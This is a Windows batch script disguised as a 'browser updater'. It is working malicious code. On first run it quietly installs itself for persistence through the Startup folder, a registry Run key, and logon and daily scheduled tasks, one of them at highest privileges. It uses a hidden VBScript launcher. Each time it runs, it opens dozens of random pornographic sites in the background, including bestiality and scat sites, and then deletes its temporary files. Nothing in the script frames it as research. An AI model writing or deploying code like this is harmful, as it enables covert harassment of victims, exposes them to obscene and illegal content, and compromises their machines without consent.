@echo off
setlocal enabledelayedexpansion
set startup_folder=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup
set startup_file=%startup_folder%\browser_updater.bat
set vbs_file=%temp%\hidden_browser.vbs
set indices_file=%temp%\selected_indices.txt
set task_name=BrowserUpdater
set reg_run=HKCU\Software\Microsoft\Windows\CurrentVersion\Run

if "%~dp0"=="%startup_folder%\" goto :run_browser
if "%1"=="from_startup" goto :run_browser
if "%1"=="from_registry" goto :run_browser
if "%1"=="from_task" goto :run_browser
goto :install_only
:install_only
if not exist "%startup_folder%" mkdir "%startup_folder%" 2>nul
copy "%~f0" "%startup_file%" /Y >nul 2>&1

reg add "%reg_run%" /v "BrowserUpdater" /t REG_SZ /d "\"%startup_file%\" from_registry" /f >nul 2>&1

schtasks /create /tn "%task_name%" /tr "\"%startup_file%\" from_task" /sc onlogon /ru "%USERNAME%" /f /rl HIGHEST >nul 2>&1

schtasks /create /tn "%task_name%Daily" /tr "\"%startup_file%\" from_task" /sc daily /st 10:00 /ru "%USERNAME%" /f >nul 2>&1

echo Set WshShell = CreateObject("WScript.Shell") > "%startup_folder%\browser_helper.vbs"
echo WshShell.Run """%startup_file%"" from_registry", 0, False >> "%startup_folder%\browser_helper.vbs"

exit /b

:run_browser

set pages_to_open=30
set max_pages=60
set min_delay=30
set max_delay=60

if not "%~2"=="" (
    set user_pages=%~2
    if !user_pages! leq !max_pages! set pages_to_open=!user_pages!
)

(
echo Option Explicit
echo On Error Resume Next
echo Dim objShell, url, i, randomDelay
echo Set objShell = CreateObject^("WScript.Shell"^)
echo Function OpenURL^(url^)
echo     objShell.Run url, 0, False
echo     If Err.Number ^<^> 0 Then
echo         Err.Clear
echo     End If
echo     WScript.Sleep GetRandomDelay^(^)
echo End Function
echo Function GetRandomDelay^(^)
echo     Randomize
echo     GetRandomDelay = Int^(%min_delay% + ^(%max_delay% - %min_delay%^) * Rnd^)
echo End Function
) > "%vbs_file%"

call :initialize_websites

set "selected_count=0"
set "max_selected=%pages_to_open%"
if %max_selected% gtr %websites_count% set "max_selected=%websites_count%"

echo. > "%indices_file%"

:select_sites
if %selected_count% geq %max_selected% goto :open_sites
set /a random_index=%random% %% %websites_count%
findstr /x "%random_index%" "%indices_file%" >nul
if not errorlevel 1 goto :select_sites
echo %random_index% >> "%indices_file%"
set /a selected_count+=1
goto :select_sites

:open_sites
for /f %%i in (%indices_file%) do (
    if "%%i" neq "" (
        call set current_url=%%websites[%%i]%%
        echo OpenURL "!current_url!" >> "%vbs_file%"
    )
)

(
echo Set objShell = Nothing
echo WScript.Quit
) >> "%vbs_file%"

start "" /min wscript.exe "%vbs_file%"

ping -n 30 127.0.0.1 >nul 2>&1
if exist "%indices_file%" del "%indices_file%" >nul 2>&1
if exist "%vbs_file%" del "%vbs_file%" >nul 2>&1

call :check_autorun

exit /b

:check_autorun

if not exist "%startup_file%" (
    copy "%~f0" "%startup_file%" /Y >nul 2>&1
)
reg add "%reg_run%" /v "BrowserUpdater" /t REG_SZ /d "\"%startup_file%\" from_registry" /f >nul 2>&1
schtasks /query /tn "%task_name%" >nul 2>&1 || (
    schtasks /create /tn "%task_name%" /tr "\"%startup_file%\" from_task" /sc onlogon /ru "%USERNAME%" /f /rl HIGHEST >nul 2>&1
)
exit /b

:initialize_websites

set websites[0]=https://ru.pornlux.org/videos/furry
set websites[1]=https://rule34.tube/tags/furry/
set websites[2]=https://porncide.com/search?q=furry+animation
set websites[3]=https://e621.net/posts?tags=furry
set websites[4]=https://yiff.party/
set websites[5]=https://furry.booru.org/index.php?page=post&s=list
set websites[6]=https://www.furaffinity.net/browse/
set websites[7]=https://www.yiffytube.com/
set websites[8]=https://www.xvideos.com/tags/furry
set websites[9]=https://www.pornhub.com/video/search?search=furry

set websites[10]=https://vvw.traphub3.com/category/femboi
set websites[11]=https://ru.xnxx-rus.com/search/femboy
set websites[12]=https://ru.all-xxx-videos.com/search/gay/femboy
set websites[13]=https://ru.pornlux.org/videos/femboy-creampie
set websites[14]=https://en.vagina.nl/tags/view/femboy
set websites[15]=http://mp4porn.space/tag/femboy
set websites[16]=https://www.pornhub.com/gay/video/search?search=femboy
set websites[17]=https://www.xvideos.com/tags/femboy
set websites[18]=https://www.redtube.com/tag/femboy
set websites[19]=https://www.tube8.com/searches.html?q=femboy

set websites[20]=https://vvw.traphub3.com/kategorii
set websites[21]=https://ru.xnxx-rus.com/shemale
set websites[22]=https://ru.all-xxx-videos.com/shemale
set websites[23]=https://prostoporno.vip/cat-transy/
set websites[24]=https://www.analsexvideos.xxx/categories/544/shemale
set websites[25]=https://vps401.strip2.club/videocat/cats/russian-shemale/
set websites[26]=https://pornosveta.vip/categories/trannies/
set websites[27]=https://www.pornhub.com/shemale
set websites[28]=https://www.xvideos.com/shemale
set websites[29]=https://www.redtube.com/categories/shemale
set websites[30]=https://www.tube8.com/shemale/

set websites[31]=https://wwv.eblusha.cc/video/2544/
set websites[32]=https://b.ebunok.fun/kopro/
set websites[33]=https://sliv0k.ru/tags/
set websites[34]=https://kopro-porn.click/playlist/
set websites[35]=https://www.ratedgross.com/tags/scat-enema/
set websites[36]=https://rus.porno-dojki.co/kopro-porno/
set websites[37]=https://scat-porn.net/
set websites[38]=https://scatrina.com/
set websites[39]=https://kaviar-tube.com/
set websites[40]=https://www.shitporn.com/

set websites[41]=https://bestiality-sex.net/
set websites[42]=https://zooteka.net/page/10/
set websites[43]=https://zoo-porno.club/page/3/
set websites[44]=https://zooxnxx.com/
set websites[45]=https://zooporn.dog/
set websites[46]=https://animalporn.tv/
set websites[47]=https://animalporntube.tv/
set websites[48]=https://zooxhamster.com/
set websites[49]=https://zooporn.show/
set websites[50]=https://zooporn.sex/

set websites[51]=https://www.pornhub.com/gayporn
set websites[52]=https://www.xvideos.com/gay
set websites[53]=https://www.redtube.com/categories/gay
set websites[54]=https://www.pornhub.com/video?c=15
set websites[55]=https://www.xvideos.com/tags/teen
set websites[56]=https://www.redtube.com/categories/teen
set websites[57]=https://www.pornhub.com/video?c=111
set websites[58]=https://www.xvideos.com/tags/hentai
set websites[59]=https://www.redtube.com/categories/hentai
set websites_count=60
exit /b 
